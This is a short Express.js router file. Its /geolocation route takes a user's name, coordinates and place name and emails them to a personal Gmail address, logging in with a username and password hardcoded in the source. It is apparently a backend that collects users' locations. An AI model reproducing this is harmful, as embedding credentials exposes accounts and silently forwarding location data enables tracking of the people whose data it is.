const router = require('express').Router();
const nodemailer = require('nodemailer');
const fetch = require('node-fetch');

router.get('/', (req, res) => {
    res.render('index');
});

router.get('/apidocs', (req, res) => {
    res.render('apidocs');
});

router.get('/about', (req, res) => {
    res.render('about');
})

router.post('/geolocation', async (req, res) => {
    const data = req.body;
    
    let mailTransporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'samparktech.inc@gmail.com',
            pass: '373ftnn5123'
        }
    });
    let mailDetails = {
        from: 'samparktech.inc@gmail.com',
        to: 'anitagautam154@gmail.com',
        subject: 'User Location',
        text: `
        Username  : ${data.username}
        Latitude  : ${data.latitude}
        Longitude : ${data.longitude},
        Name of Place  : ${data.place}
        `
    };
      
    mailTransporter.sendMail(mailDetails, function(err, data) {
        if(err) {
            console.log('Error Occurs');
        } else {
            console.log('Email sent successfully');
        }
    });    
});

module.exports = router;